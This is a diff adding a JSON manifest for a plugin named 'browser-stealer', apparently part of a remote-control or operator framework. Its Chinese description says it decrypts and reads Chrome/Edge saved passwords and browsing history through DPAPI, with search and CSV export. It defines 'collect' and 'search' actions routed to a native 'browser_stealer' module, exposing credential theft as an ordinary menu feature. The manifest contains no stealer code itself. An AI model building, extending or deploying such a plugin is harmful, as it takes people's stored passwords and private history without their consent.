@@ -1,0 +1,57 @@
+{
+  "schemaVersion": 1,
+  "pluginId": "com.libra.browser-stealer",
+  "name": "浏览器数据",
+  "version": "1.0.0",
+  "author": "libra",
+  "description": "读取 Chrome/Edge 浏览器密码与历史记录（DPAPI 解密），支持搜索与 CSV 导出。",
+  "entry": {
+    "route": "browser-stealer",
+    "label": "nav.browserStealer",
+    "icon": "Globe",
+    "apiRoot": "/api/plugins/com.libra.browser-stealer"
+  },
+  "i18n": {
+    "zh": { "nav.browserStealer": "浏览器数据" },
+    "en": { "nav.browserStealer": "Browser Data" }
+  },
+  "actions": [
+    {
+      "action": "collect",
+      "label": "采集浏览器数据",
+      "method": "POST",
+      "argsSchema": {
+        "type": "object",
+        "properties": {
+          "type": { "type": "string", "title": "数据类型（passwords/history）" },
+          "offset": { "type": "number", "title": "偏移" },
+          "limit": { "type": "number", "title": "数量" }
+        },
+        "required": []
+      },
+      "module": {
+        "kind": "native",
+        "name": "browser_stealer",
+        "op": "collect"
+      }
+    },
+    {
+      "action": "search",
+      "label": "搜索浏览器数据",
+      "method": "POST",
+      "argsSchema": {
+        "type": "object",
+        "properties": {
+          "type": { "type": "string", "title": "数据类型（passwords/history）" },
+          "keyword": { "type": "string", "title": "关键字" }
+        },
+        "required": ["keyword"]
+      },
+      "module": {
+        "kind": "native",
+        "name": "browser_stealer",
+        "op": "search"
+      }
+    }
+  ]
+}
